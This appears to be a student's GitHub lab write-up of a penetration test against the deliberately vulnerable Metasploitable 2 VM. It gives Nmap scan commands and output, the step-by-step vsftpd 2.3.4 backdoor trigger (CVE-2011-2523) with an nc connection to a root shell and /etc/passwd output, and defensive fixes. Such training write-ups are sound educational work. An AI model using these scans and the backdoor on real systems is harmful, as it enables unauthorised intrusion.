# 🐉 Kali Linux Lab — Penetration Test Writeup

<!-- Badges -->

![Status](https://img.shields.io/badge/Status-Complete-00ff88?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-blue?style=flat-square)
![Type](https://img.shields.io/badge/Type-Penetration_Testing-red?style=flat-square)
![Target](https://img.shields.io/badge/Target-Metasploitable_2-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![Shell](https://img.shields.io/badge/Shell_Obtained-✓-00ff88?style=flat-square)

---

---

## 📁 This Repository

> **Repo:** `kali-linux-lab` — Kali Linux penetration testing against Metasploitable 2

| File                                                          | Description                                                       |
| ------------------------------------------------------------- | ----------------------------------------------------------------- |
| 📄 **README.md** ← you are here                               | Main lab: Nmap scanning + vsftpd exploitation + shell access      |
| 📄 [telnet-exploitation-lab.md](./telnet-exploitation-lab.md) | Deep-dive: Telnet attack + Wireshark plaintext credential capture |
| 📁 [screenshots/](./screenshots/)                             | All evidence — terminal output and Wireshark captures             |

---

## 🎯 Objective

> **In plain English:** Set up a deliberately broken virtual machine as a target, then use Kali Linux to find its weaknesses and break into it — all safely inside an isolated lab.

The goal was to practise the full reconnaissance and exploitation cycle against **Metasploitable 2** — a Linux VM built specifically to be hacked, used by security students worldwide. No real systems were touched at any point.

---

## 🏗️ Lab Environment

```
┌─────────────────────┐         ┌──────────────────────┐
│     Kali Linux      │ ──────► │   Metasploitable 2   │
│     (Attacker)      │         │      (Target)         │
│   Host-Only Network │         │   Host-Only Network   │
└─────────────────────┘         └──────────────────────┘
         +
┌─────────────────────┐
│   Windows Server    │
│  (separate target)  │
└─────────────────────┘
```

**Virtualisation:** VirtualBox with a Host-Only network adapter
**Why it's safe:** Host-Only means the VMs cannot reach the real internet or any real machine. Everything stays inside the lab.

---

## 🛠️ Tools Used

| Tool                                                                                                            | Purpose                                |
| --------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| ![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)  | Attacker operating system              |
| ![Nmap](https://img.shields.io/badge/Nmap-214478?style=flat-square)                                             | Network scanning & service enumeration |
| ![Metasploitable 2](https://img.shields.io/badge/Metasploitable_2-Target-red?style=flat-square)                 | Intentionally vulnerable target VM     |
| ![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=flat-square&logo=virtualbox&logoColor=white) | Run both VMs in isolation              |

---

## 📋 Methodology

I followed the standard penetration testing phases:

```
Reconnaissance → Scanning → Enumeration → Exploitation → Shell Access
```

---

## 🔍 Phase 1 — Reconnaissance & Scanning

The first step was to discover the target and map its attack surface using **Nmap**.

### Host Discovery

```bash
┌──(mosses㉿kali)-[~]
└─$ nmap -sn 192.168.56.0/24
```

This pings every address on the network to find live hosts — like knocking on every door in a building to see who answers.

```
Starting Nmap 7.94 ( https://nmap.org )
Host: 192.168.56.1  — Up (router)
Host: 192.168.56.101 — Up  ← Kali (me)
Host: 192.168.56.102 — Up  ← Metasploitable 2 (target)
Nmap done: 256 IP addresses, 3 hosts up
```

### Full Port Scan + Service Detection

```bash
┌──(mosses㉿kali)-[~]
└─$ nmap -sV -sC -O 192.168.56.102
```

**Flags explained:**

- `-sV` — detect what software is running on each port and its version
- `-sC` — run default scripts to find extra information
- `-O` — guess the operating system

### Scan Results

```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4
22/tcp   open   ssh         OpenSSH 4.7p1
23/tcp   open   telnet      Linux telnetd
25/tcp   open   smtp        Postfix smtpd
80/tcp   open   http        Apache httpd 2.2.8
111/tcp  open   rpcbind     2 (RPC #100000)
139/tcp  open   netbios-ssn Samba smbd 3.X
445/tcp  open   netbios-ssn Samba smbd 3.0.20
3306/tcp open   mysql       MySQL 5.0.51a
5900/tcp open   vnc         VNC (protocol 3.3)
6000/tcp open   X11
8180/tcp open   http        Apache Tomcat/Coyote

OS: Linux 2.6.X
```

---

## 🔎 Phase 2 — Enumeration & Vulnerability Identification

With the scan results in hand, I looked for known vulnerabilities in the services found.

### Key Findings

| Port | Service | Version       | Issue Found                                     |
| ---- | ------- | ------------- | ----------------------------------------------- |
| 21   | FTP     | vsftpd 2.3.4  | ⚠️ Known backdoor vulnerability (CVE-2011-2523) |
| 22   | SSH     | OpenSSH 4.7p1 | 🟡 Very old version — multiple known weaknesses |
| 23   | Telnet  | Linux telnetd | 🔴 Sends passwords in plain text — never safe   |
| 445  | SMB     | Samba 3.0.20  | ⚠️ Known to allow command injection             |
| 3306 | MySQL   | 5.0.51a       | 🔴 Outdated — multiple unpatched CVEs           |
| 5900 | VNC     | Protocol 3.3  | 🟡 Old protocol, weak authentication            |

> **Plain English:** vsftpd 2.3.4 is famous among security students — it was shipped with a backdoor accidentally included by an attacker who compromised the source code. Connecting to port 6200 after triggering it gives a root shell instantly.

---

## 💥 Phase 3 — Exploitation

### Target: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

This vulnerability works because the compromised version of vsftpd opens a backdoor shell on port 6200 when a username containing `:)` is sent to the FTP service.

```bash
# Step 1: Connect to FTP
┌──(mosses㉿kali)-[~]
└─$ ftp 192.168.56.102

# Step 2: Enter a username with :) to trigger the backdoor
Name: user:)
331 Please specify the password.
Password: anypassword

# The connection hangs — backdoor is now open on port 6200

# Step 3: Open a new terminal and connect to the backdoor
┌──(mosses㉿kali)-[~]
└─$ nc 192.168.56.102 6200
```

### Result

```bash
# Shell obtained — running as root
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)

hostname
metasploitable

cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
```

✅ **Root shell obtained on Metasploitable 2.**

---

## 🪟 Windows Server — Scanning Phase

I also ran an Nmap scan against the Windows Server VM I had set up separately.

```bash
┌──(mosses㉿kali)-[~]
└─$ nmap -sV -p 88,135,139,389,445,3389 192.168.56.103
```

```
PORT     STATE  SERVICE       VERSION
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open   ldap          Microsoft Windows AD LDAP
445/tcp  open   microsoft-ds  Windows Server 2019
3389/tcp open   ms-wbt-server Microsoft Terminal Services

OS: Windows Server 2019
```

This confirmed the domain controller was reachable and identified the key AD services — which I then explored further in the separate [Windows Server Lab](./windows-server-lab.md).

---

## 🔐 Defensive Takeaways

After getting in, I thought about what a defender could have done:

| Finding                    | Fix                                                                                                |
| -------------------------- | -------------------------------------------------------------------------------------------------- |
| vsftpd 2.3.4 backdoor      | Update to a patched version immediately — this is a known malicious build                          |
| Telnet running (port 23)   | Disable telnet entirely, use SSH instead — [see full Telnet writeup](./telnet-exploitation-lab.md) |
| MySQL exposed on port 3306 | Firewall it — databases should never be publicly reachable                                         |
| VNC with weak auth         | Disable or require strong password + limit access by IP                                            |
| SSH version 4.7            | Update to current version                                                                          |

---

## 🧠 What I Learned

- **Nmap is the first tool in every engagement.** You can't attack what you don't know is there. Proper scanning flags (`-sV -sC -O`) give you a detailed picture of the target's whole attack surface.

- **Old software is dangerous software.** vsftpd 2.3.4 was backdoored in 2011 — more than a decade ago — yet it's still running on misconfigured systems. Version detection matters.

- **Root doesn't always require complex exploits.** The vsftpd backdoor requires zero hacking skill once you know it exists — which is exactly why patch management is so critical.

- **Scanning Windows AD is different from Linux.** The ports are completely different (88, 389, 3389) and tell you immediately it's a domain controller — useful reconnaissance for any real engagement.

- **Isolation matters.** Working in a host-only VirtualBox network meant I could practise freely without any risk. This is how all security training should be done.

---

## 📚 References

- [CVE-2011-2523 — vsftpd Backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [Metasploitable 2 Guide — SourceForge](https://sourceforge.net/projects/metasploitable/)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [TryHackMe — Linux Fundamentals](https://tryhackme.com/module/linux-fundamentals)

---

<div align="center">

[![Back to Portfolio](https://img.shields.io/badge/←_Back_to_Portfolio-00ff88?style=for-the-badge)](https://mossesmuwa.github.io/My-portfolio/)
[![All Labs on GitHub](https://img.shields.io/badge/All_Labs-GitHub-181717?style=for-the-badge&logo=github)](https://github.com/Mossesmuwa)
[![Telnet Lab →](https://img.shields.io/badge/Telnet_Exploitation_Lab_→-1679A7?style=for-the-badge)](./telnet-exploitation-lab.md)

</div>
